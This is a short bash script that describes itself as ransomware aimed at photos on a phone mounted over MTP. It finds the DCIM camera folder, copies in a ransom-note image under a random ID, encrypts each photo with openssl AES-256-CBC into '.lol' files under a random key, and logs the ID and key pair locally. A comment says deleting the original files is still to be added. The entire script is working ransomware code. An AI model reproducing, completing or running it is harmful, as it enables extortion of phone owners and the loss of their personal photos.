#!/bin/bash
#This script finds and encrypts photos found in the camera folder, as well as leaves behind a nasty ransom letter.

PHONEPATH=$(echo /run/user/$UID/gvfs/mtp*/*/DCIM/CameraDev)

LOCALPATH=$(pwd)

echo $PHONEPATH


#drop ransom note
ransomid=$(openssl rand 16 -hex)
echo "Dropping note..."
cp "media/ransomnote.png" "$PHONEPATH/ransom_$ransomid.png"
echo "Note dropped as ransom_$ransomid.png"
echo ""
echo ""


#encrypt files. REMINDER: don't encrypt the note
enc_key=$(openssl rand 16 -hex)

cd "$PHONEPATH"

currentfile=1
filecount=$(ls -1 | grep -v "ransom" | grep -v ".lol" | wc -l)
 
for f in *
do 
	
	if [[ $f != "ransom"* ]] && [[ $f != *".lol" ]]; then
		echo "encrypting $f ($currentfile/$filecount)..."
		openssl aes-256-cbc -a -salt -in $f -out $f.lol -k $enc_key
		#dont forget to delete orginal file
		currentfile=$((currentfile+1))
	fi

done

cd $LOCALPATH 
echo $ransomid $enc_key >> keys/keys.txt #store ransomid and encryption key pair
echo Encryption complete. check keys/keys.txt for ransom id and key